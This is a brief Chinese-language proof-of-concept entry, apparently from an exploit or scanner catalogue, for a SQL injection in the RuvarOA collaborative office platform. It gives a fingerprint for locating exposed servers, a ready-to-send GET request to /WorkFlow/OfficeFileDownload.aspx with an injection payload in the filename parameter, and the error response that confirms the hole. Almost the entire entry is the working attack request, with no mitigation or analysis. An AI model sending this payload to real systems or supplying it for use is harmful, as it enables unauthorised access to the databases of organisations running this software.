# RuvarOA协同办公平台-OfficeFileDownload-SQL注入

RuvarOA ｜ SQL注入 ｜ —
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1`
- **响应特征**：500 nvarchar